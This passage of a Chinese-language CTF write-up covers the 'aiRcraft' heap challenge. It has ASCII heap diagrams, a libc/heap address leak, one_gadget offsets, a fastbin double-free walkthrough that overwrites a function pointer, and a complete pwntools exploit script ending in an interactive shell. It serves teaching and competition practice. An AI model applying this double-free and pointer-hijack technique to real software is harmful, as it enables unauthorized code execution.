                  |       prevsize        |         |
                  +-----------------------+         |
                  |         size          |         |
                  +-----------------------+&lt;---+    |
                  |                       |    |    |
                  |        ......         |    |    |
                  |                       |    |    |
                  |                       |    |    |
                  +-----------------------+    |    |
                  |     company_name      |----+----+
                  +-----------------------+    |     
                  |                       |    |     
                  |        ......         |    |     
                  |                       |    |     
                  |                       |    |     
   airport2------&gt;+-----------------------+    |     
                  |       prevsize        |    |     
                  +-----------------------+    |     
                  |         size          |    |     
                  +-----------------------+    |     
               +--|     airport_name      |    |     
               |  +-----------------------+    |     
               |  |       planes[0]       |----+     
               |  +-----------------------+          
               |  |                       |          
               |  |        ......         |          
               |  |                       |          
               |  |                       |          
               |  +-----------------------+          
               |  |       prevsize        |          
               |  +-----------------------+          
               |  |         size          |          
               |  +-----------------------+          
               |  |                       |          
               |  |         name          |          
               +-&gt;|                       |          
                  |                       |          
                  +-----------------------+
```

此时将airport1释放（sell_airport），则情形会变成这样：

```
heapbase  ------&gt;+-----------------------+          
 airport1         |       prevsize        |          
                  +-----------------------+          
                  |         size          |          
                  +-----------------------+&lt;--------+
                  | fd(main_arena+offset) |----+    |
                  +-----------------------+    |    |
                  | bk(main_arena+offset) |    |    |
                  +-----------------------+    |    |
                  |        ......         |    |    |
 airport1's------&gt;+-----------------------+    |    |
 name string      |       prevsize        |    |    |
                  +-----------------------+    |    |
                  |         size          |    |    |
                  +-----------------------+&lt;---+    |
                  |                       |         |
                  |         name          |         |
                  |                       |         |
                  |                       |         |
    plane1 ------&gt;+-----------------------+         |
                  |       prevsize        |         |
                  +-----------------------+         |
                  |         size          |         |
                  +-----------------------+&lt;---+    |
                  |                       |    |    |
                  |        ......         |    |    |
                  |                       |    |    |
                  |                       |    |    |
                  +-----------------------+    |    |
                  |     company_name      |----+----+
                  +-----------------------+    |     
                  |                       |    |     
                  |        ......         |    |     
                  |                       |    |     
                  |                       |    |     
   airport2------&gt;+-----------------------+    |     
                  |       prevsize        |    |     
                  +-----------------------+    |     
                  |         size          |    |     
                  +-----------------------+    |     
               +--|     airport_name      |    |     
               |  +-----------------------+    |     
               |  |       planes[0]       |----+     
               |  +-----------------------+          
               |  |                       |          
               |  |        ......         |          
               |  |                       |          
               |  |                       |          
               |  +-----------------------+          
               |  |       prevsize        |          
               |  +-----------------------+          
               |  |         size          |          
               |  +-----------------------+          
               |  |                       |          
               |  |         name          |          
               +-&gt;|                       |          
                  |                       |          
                  +-----------------------+
```

由于plane1-&gt;company_name的值不变，因此仍指向相同的位置，但是此时airport1-&gt;airport_name的位置已经变成了free chunk中的双链表指针，指向main_arena+offset，这里offset仍然是一个固定的偏移量，此时对airport2再次进行list，我们就可以得到libc的基址。

题目已经提供了libc.so.6文件，我们理论上就可以知道libc中任何代码在此时的位置，只需要将代码在libc中的偏移量加上libc的基址就可以了。这里我们对one_gadget比较感兴趣，我们用one_gadget工具就可以得到一些信息：

```
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

这里的任何一个地址，只要满足了下面的限制条件，跳转过去可以直接getshell。

### 2. Double Free &amp; Get Shell

现在我们已经知道了应该将执行流劫持到什么地址了，于是我们的目标变为了劫持执行流。

在之前提到了，由于sell_plane()函数并没有将airport-&gt;planes数组中的对应位置清空，因此我们理论上可以无限次进行free操作，这里我们只需要两次就足够了。

对于Fast Bin的Double Free的方法已经有非常详尽的教程，这里只简要叙述：

```
int main()`{`
	void *a = malloc(0x10);
	void *b = malloc(0x10);
	free(a);
	free(b);
	free(a);
	a = malloc(0x10);
	b = malloc(0x10);
	void *c = malloc(0x10);
`}`
```

在上面的一段代码中，最终的结果是a==c，具体原因不再赘述，成功的关键在于两次free(a)的操作之间必须要free一个大小处于同一个Fast Bin的chunk。

在我们的题目中若要两次free一个plane，必须第一次调用sell_plane()函数，第二次调用sell_airport()函数（此时要求该plane处于airport-&gt;planes数组中），而不能反过来，因为sell_airport()函数调用之后就会将plane从plane_header所维护的链表中解除链接，再去调用sell_plane()函数就无法再定位到这个plane了（sell_plane()函数之前是先遍历链表来找到plane地址）。

但是即使知道了这一点，我们同样无法使用plane1进行Double Free操作，接下来我将描述一下这个细节：

假设我们再申请一个plane2用于中间的一次free操作，那么在Free之前链表处于这样的状态：

```
plane_header       plane1          plane2  
 +-------+        +-------+       +-------+
 |  ufd  |-------&gt;|  ufd  |------&gt;|  ufd  |
 +-------+        +-------+       +-------+
 |  ubk  |&lt;-------|  ubk  |&lt;------|  ubk  |
 +-------+        +-------+       +-------+
```

此时我们对plane1进行free操作：

```
plane_header         plane2  
 +-------+          +-------+
 |  ufd  |---------&gt;|  ufd  |
 +-------+          +-------+
 |  ubk  |&lt;---------|  ubk  |
 +-------+          +-------+
     ^                  ^    
     |                  |    
     |                  |    
     |                  |    
     |     plane1       |    
     |    +-------+     |    
     |    |  ufd  |-----+    
     |    +-------+          
     +----|  ubk  |          
          +-------+
```

对plane2进行free操作：

```
plane_header                  plane2               
 +-------+                   +-------+             
 |  ufd  |-----&gt; null        |  ufd  |-----&gt;  null 
 +-------+                   +-------+             
 |  ubk  |&lt;------------------|  ubk  |             
 +-------+                   +-------+             
     ^                           ^                 
     |                           |                 
     |                           |                 
     |                           |                 
     |     plane1                |                 
     |    +-------+              |                 
     |    |  ufd  |--------------+                 
     |    +-------+                                
     +----|  ubk  |                                
          +-------+
```

对plane1进行第二次free操作：

为了方便读者对照，这里将unlink_plane函数在这里写一遍：

```
struct plane *unlink_plane(struct plane *plane)
	`{`
  	struct plane *result;

  	plane-&gt;ubk-&gt;ufd = plane-&gt;ufd;
  	result = plane-&gt;ufd;
  	if ( result )
  	`{`
    	result = plane-&gt;ufd;
    	result-&gt;ubk = plane-&gt;ubk;
  	`}`
  	return result;
	`}`
```

因此最终的情形是这样：

```
plane_header                  plane2               
 +-------+                   +-------+             
 |  ufd  |------------------&gt;|  ufd  |-----&gt;  null 
 +-------+                   +-------+             
 |  ubk  |&lt;------------------|  ubk  |             
 +-------+                   +-------+             
     ^                           ^                 
     |                           |                 
     |                           |                 
     |                           |                 
     |     plane1                |                 
     |    +-------+              |                 
     |    |  ufd  |--------------+                 
     |    +-------+                                
     +----|  ubk  |                                
          +-------+
```

没错，又被还原了，原因在于plane1在从链表中取下之后并没有将前后的指针清零，现在看来还没有什么问题，我们继续往下操作。

现在的Fast Bins中存在有三个chunk（实际上是两个，但是plane1所在的chunk出现了两次）：

Fast bin—&gt;plane1—&gt;plane2—&gt;plane1

为了方便读者对照，这里同样将add_plane_to_linklist函数的代码在这里列出：

```
plane* add_plane_to_linklist(struct plane *plane)`{`
	struct plane *result;
	struct plane *i;
	
	for( i = &amp;plane_header; i-&gt;ufd; i = i-&gt;ufd);
	
	i-&gt;ufd = plane;
	plane-&gt;ufd = 0;
	result = plane;
	plane-&gt;ubk = i;
	return result;
`}`
```

现在我们进行第一次申请，我们会得到plane1所在的chunk，Fast bin如下：

Fast bin—&gt;plane2—&gt;plane1

链表会变成如下结构：

```
plane_header        plane2           plane1  
 +-------+         +-------+        +-------+
 |  ufd  |--------&gt;|  ufd  |-------&gt;|  ufd  |
 +-------+         +-------+        +-------+
 |  ubk  |&lt;--------|  ubk  |&lt;-------|  ubk  |
 +-------+         +-------+        +-------+
```

现在我们进行第二次申请，我们会得到plane2所在的chunk，Fast bin如下：

Fast bin—&gt;plane1

链表会变成如下结构：

```
+------------------------+
                        v                        |
plane_header        plane2           plane1      |
 +-------+         +-------+        +-------+    |
 |  ufd  |--------&gt;|  ufd  |--&gt;null |  ufd  |----+
 +-------+         +-------+        +-------+     
 |  ubk  |      +--|  ubk  |&lt;-------|  ubk  |     
 +-------+      |  +-------+        +-------+     
                |                       ^         
                |                       |         
                +-----------------------+ 
```

此时链表的结构已经被完全破坏，我们继续往下。现在Fast bin中只剩下了一个chunk，即plane1所在的chunk，我们通过build_airport函数可以申请指定大小的chunk的特性，申请与plane1所在chunk一样大的空间（申请0x48大小，实际大小0x58），由于这个空间原本是用于填写airport_name所指向字符串，因此我们可以完全控制它的内容，于是我们可以顺利更改plane1-&gt;free_pointer（仍有一些小细节在后面会提到），之后理所应当应该调用函数触发free_pointer，但是当我们尝试调用sell_plane()函数时，函数顺着链表检索下去，到了plane2就会认为已经到了链表的结尾（因为plane2-&gt;ufd==null），无法找到plane1，因此无法顺利进行下去了。

要解决这个问题很简单，有两种思路：

1. 只需要两次Double Free的对象在一开始位于链表的尾部就可以了，我们可以使用plane2作为DoubleFree的对象，于是我们需要再申请一个airport对象，并将plane2通过fly_to函数加入新申请的airport的planes数组中，用于两次free操作，这个思路的操作方法并不惟一，但是必须保证Double Free的对象处于链表的尾部；

2. 在第三次申请之前，将plane1通过fly_to的操作加入某个airport的planes数组中（不妨称它为tmp_airport），当第三次通过build_airport函数将plane1改写之后，可以通过sell_airport(tmp_airport)的操作触发plane1的free_pointer。

最后我们需要再考虑一个细节，当我们通过build_airport函数改写plane1中的内容时，有几个位置的内容并不是可以随意更改的。我们将plane的结构画在下面：

```
+--------------+
|   prevsize   |
+--------------+
|     size     |
+--------------+
|              |
|              |
|              |
|              |
|  plane_name  |
|    (0x20)    |
|              |
|              |
|              |
|              |
+--------------+
| company_name |
+--------------+
|   airport    |
+--------------+
|     ubk      |
+--------------+
|     ufd      |
+--------------+
| free_pointer |
+--------------+
```

我们的目标是free_pointer，但是当我们最后一次申请时，程序将它全部当作了字符串，因此我们不可避免地要覆盖前面的所有内容，这里有这样几条限制条件：

1. plane_name的字符串后面必须加上’\0’，这样才能截断形成字符串，用于sell_plane函数定位plane1的地址；

2. ubk与ufd所指向的地址必须能够通过unlink_plane函数，如果随意填写，就会造成段错误，这里我的做法是在覆写之前下断点，记录下原本ubk与ufd的值，计算它们与heap基址的偏移量offsetbk与offsetfd，虽然在实际运行的过程中地址会不同，但是堆的布局都是相同的，因此我们只需要用heapbase+offsetbk与heapbase+offsetfd去分别覆盖着两个部分就能保证通过unlink_plane函数（这里的heapbase是我们之前得到的堆基址）；

3. 将free_pointer覆盖成one_gadget所在的地址（libcbase+offset(one_gadget)）。

最后调用sell_plane()函数将plane1释放，即可Get Shell。

one_gadget的限制条件并不是每次都能满足，有时可能需要多试几个，甚至有时都不能满足条件，但是这道题第一个就可以直接满足条件。



## My Exploit

```
from pwn import *
DEBUG=0

if(DEBUG==1):
    context(os='linux', arch='i386', log_level='debug')

libc=ELF('./libc.so.6')

heapbase=0
mainarena=0
libcbase=0
p=process('./aiRcraft')

gadget1=0x45216
gadget2=0x4526a
gadget3=0xf02a4
gadget4=0xf1147

def buy_plane(company, name):
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.recvuntil('Your choice: ')
    p.sendline(str(company))
    p.recvuntil('Input the plane\'s name: ')
    p.send(name)

def build_airport(length, name):
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.recvuntil('How long is the airport\'s name? ')
    p.sendline(str(length))
    p.recvuntil('Please input the name: ')
    p.send(name)

def sell_airport(num):
    p.recvuntil('Your choice: ')
    p.sendline('3')
    p.recvuntil('Which airport do you want to choose? ')
    p.sendline(str(num))
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.recvuntil('Success!')

def list_plane(num):
    p.recvuntil('Your choice: ')
    p.sendline('3')
    p.recvuntil('Which airport do you want to choose? ')
    p.sendline(str(num))
    p.recvuntil('Your choice: ')
    p.sendline('1')
    string=p.recvuntil('What do you want to do ?')[:-25]
    p.recvuntil('Your choice: ')
    p.sendline('3')
    return string

def fly_to(name, num):
    p.recvuntil('Your choice: ')
    p.sendline('4')
    p.recvuntil('Which plane do you want to choose? ')
    p.send(name)
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.recvuntil('which airport do you want to fly? ')
    p.sendline(str(num))
    p.recvuntil('Your choice: ')
    p.sendline('3')

def sell_plane(name):
    p.recvuntil('Your choice: ')
    p.sendline('4')
    p.recvuntil('Which plane do you want to choose? ')
    p.send(name)
    p.recvuntil('Your choice: ')
    p.sendline('2')


def main():
    build_airport(16, 'stuff\n')
    buy_plane(13, 'tel\n')
    build_airport(16, 'listen\n')
    fly_to('tel\n', 1)
    sell_airport(0)
    mainarena=u64(list_plane(1).split('\n')[1][9:]+'\x00\x00')-88
    print hex(mainarena)
    buy_plane(1, 'stuff1\n')
    buy_plane(2, 'stuff2\n')
    sell_plane('stuff2\n')
    sell_plane('stuff1\n')
    heapbase=u64(list_plane(1).split('\n')[1][9:]+'\x00\x00')-0x1b0
    print hex(heapbase)
    libcbase=mainarena-0x3C4B20
    build_airport(16, 'op\n')
    buy_plane(1, 'stuff1\n')
    buy_plane(2, 'stuff2\n')

    buy_plane(1, 'tmp2\n')
    buy_plane(2, 'tmp1\n')
    fly_to('tmp1\n', 2)
    sell_plane('tmp1\n')
    sell_plane('tmp2\n')
    sell_airport(2)
    buy_plane(1, 'tmp1\n')
    buy_plane(2, 'tmp2\n')
    pause()
    payload=''
    payload+='kongjia'+'\0'
    payload+=p64(0)*5
    payload+=p64(0x1c0+heapbase)
    payload+=p64(0x2a0+heapbase)
    payload+=p64(libcbase+gadget1)
    build_airport(0x48, payload)
    sell_plane('kongjia\n')
    p.interactive()



if __name__=='__main__':
    main()
```

这份exploit与之前所讲的思路有一些细节上的不同，但是都在之前静态分析出的框架之下，只需要简单调试就能看懂。
